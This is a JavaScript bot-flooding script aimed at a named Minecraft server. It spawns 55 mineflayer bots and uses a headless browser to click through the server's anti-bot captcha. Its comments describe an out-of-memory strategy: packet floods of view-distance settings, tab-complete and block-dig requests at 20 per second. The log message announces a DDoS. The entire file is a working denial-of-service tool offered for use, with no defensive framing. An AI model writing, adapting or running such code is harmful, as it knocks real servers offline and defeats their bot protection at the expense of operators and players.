const mineflayer = require('mineflayer');
const playwright = require('playwright-chromium');

const SETTINGS = {
    host: "mc.risemine.space",
    port: 25565,
    version: "1.16.5",
    pass: "die",
    botCount: 55, // Оптимально для 7GB RAM Гитхаба, чтобы не вылететь самому
    joinDelay: 100
};

let sharedBrowser;
async function initBrowser() { sharedBrowser = await playwright.chromium.launch({ headless: true }); }

async function passCaptcha(url) {
    if (!sharedBrowser) return;
    const ctx = await sharedBrowser.newContext();
    const page = await ctx.newPage();
    try {
        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 20000 });
        const cb = await page.$('.recaptcha-checkbox-border');
        if (cb) await cb.click();
        await page.waitForTimeout(5000);
    } catch (e) {} finally { await page.close(); await ctx.close(); }
}

function createBot(id) {
    const bot = mineflayer.createBot({
        host: SETTINGS.host,
        port: SETTINGS.port,
        username: `Niko_${Math.random().toString(36).substring(7)}`,
        version: SETTINGS.version
    });

    bot.on('message', (m) => {
        const msg = m.toString();
        if (msg.includes('mineguard.pro')) {
            const url = msg.match(/https:\/\/mineguard\.pro\/captcha\/[a-zA-Z0-9]+/);
            if (url) passCaptcha(url[0]);
        }
    });

    bot.on('spawn', () => {
        // Авторизация
        setTimeout(() => bot.chat(`${SETTINGS.pass} ${SETTINGS.pass}`), 2000);

        // ЦИКЛ УНИЧТОЖЕНИЯ ОПЕРАТИВКИ (OOM STRATEGY)
        setInterval(() => {
            if (!bot.entity) return;

            // 1. Пакеты настроек (View Distance) - заставляют сервер готовить чанки
            bot._client.write('settings', { 
                locale: 'en_US', viewDistance: 32, chatFlags: 0, chatColors: true, skinParts: 127, mainHand: 0 
            });

            // 2. Tab-Complete Flood - забивает основной поток обработки (Main Thread)
            bot._client.write('tab_complete', {
                transactionId: Math.floor(Math.random() * 1000),
                text: '/'
            });

            // 3. Пакеты взаимодействия с блоками (под собой)
            const pos = bot.entity.position.floored();
            bot._client.write('block_dig', { status: 0, location: pos.offset(0, -1, 0), face: 1 });
            
            // 4. Постоянное микродвижение для обновления чанков
            bot.entity.position.x += (Math.random() - 0.5) * 2;
            bot.entity.position.z += (Math.random() - 0.5) * 2;
        }, 50); // Частота 20 раз в секунду
    });

    bot.on('error', () => { console.log("[DDoS] Time out, server is gone? :D"); });
    bot.on('end', () => setTimeout(() => createBot(id), 1000));
}

initBrowser().then(() => {
    for (let i = 0; i < SETTINGS.botCount; i++) {
        setTimeout(() => createBot(i), i * SETTINGS.joinDelay);
    }
});
